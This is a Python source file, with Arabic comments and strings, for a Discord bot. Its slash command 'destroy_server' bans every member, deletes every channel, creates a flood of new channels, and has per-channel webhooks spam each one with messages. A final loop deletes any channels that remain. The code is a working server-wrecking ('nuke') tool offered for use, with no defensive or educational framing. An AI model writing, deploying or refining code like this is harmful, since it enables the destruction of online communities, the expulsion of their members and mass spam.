import os
import asyncio
import discord
from discord import app_commands
from discord.ext import commands


class MyBot(commands.Bot):

    def __init__(self):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.guild_messages = True
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("تم مزامنة أوامر السلاش بنجاح.")


bot = MyBot()


@bot.event
async def on_ready():
    print(f"تم تسجيل الدخول باسم: {bot.user}")


@bot.tree.command(
    name="destroy_server",
    description="أمر تدمير السيرفر بالسرعة القصوى وضمان عدم بقاء أي روم",
)
@app_commands.describe(
    room_name="اسم الرومات الجديدة (بدون أرقام)",
    rooms_count="عدد الرومات المراد إنشاؤها",
    webhook_name="اسم الويب هوك",
    message_content="محتوى رسالة السبام",
    messages_count="عدد الرسائل في كل روم",
)
async def destroy_server(
    interaction: discord.Interaction,
    room_name: str,
    rooms_count: int,
    webhook_name: str,
    message_content: str,
    messages_count: int,
):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "يجب أن تكون مشرفاً لاستخدام هذا الأمر.", ephemeral=True
        )
        return

    await interaction.response.send_message(
        "جاري التنفيذ بأقصى سرعة وضمان عدم بقاء أي روم...", ephemeral=True
    )
    guild = interaction.guild

    # 1. حظر الأعضاء دفعة واحدة
    async def ban_member(member):
        if member.id == bot.user.id or member.id == interaction.user.id:
            return
        try:
            await guild.ban(member, reason="تدمير السيرفر")
        except:
            pass

    ban_tasks = [ban_member(m) for m in guild.members]

    # 2. دالة الحذف السريع الفردي
    async def delete_channel(channel):
        if channel.id == interaction.channel.id:
            return
        try:
            await channel.delete()
        except:
            pass

    # الدفعة الأولى: حذف صاروخي فوري لكل الرومات
    initial_channels = [
        c for c in guild.channels if c.id != interaction.channel.id
    ]
    delete_tasks = [delete_channel(c) for c in initial_channels]

    # 3. إنشاء الرومات (لكل روم ويب هوك خاص فيه) وإرسال السبام
    category = interaction.channel.category

    async def create_and_spam(i):
        try:
            name = room_name
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(
                    send_messages=True, view_channel=True
                )
            }
            if category:
                channel = await guild.create_text_channel(
                    name, category=category, overwrites=overwrites
                )
            else:
                channel = await guild.create_text_channel(name, overwrites=overwrites)

            # لكل روم ويب هوك خاص به هنا
            webhook = await channel.create_webhook(name=webhook_name)

            # إرسال الرسائل للويب هوك الخاص بهذا الروم مع ضمان عدم الضياع
            for _ in range(messages_count):
                try:
                    await webhook.send(content=message_content)
                except:
                    try:
                        await asyncio.sleep(0.05)
                        await webhook.send(content=message_content)
                    except:
                        pass
        except:
            pass

    create_tasks = [create_and_spam(i) for i in range(1, rooms_count + 1)]

    # إطلاق الحذف والإنشاء والحظر مع بعض
    await asyncio.gather(
        asyncio.gather(*ban_tasks, return_exceptions=True),
        asyncio.gather(*delete_tasks, return_exceptions=True),
        asyncio.gather(*create_tasks, return_exceptions=True),
        return_exceptions=True,
    )

    # **نظام الفحص والتنظيف الأخير (يضمن عدم بقاء أي روم معلق)**
    for _ in range(2):  # محاولتين سريعتين جداً لضمان القضاء على أي روم بقي
        leftover_channels = [
            c for c in guild.channels if c.id != interaction.channel.id
        ]
        if not leftover_channels:
            break
        cleanup_tasks = [delete_channel(c) for c in leftover_channels]
        await asyncio.gather(*cleanup_tasks, return_exceptions=True)
        await asyncio.sleep(0.1)

    # حذف الروم الحالي بالآخر
    try:
        await interaction.channel.delete()
    except:
        pass


MASTERGUARD_TOKEN = os.environ.get('MASTERGUARD_TOKEN')
bot.run(MASTERGUARD_TOKEN)
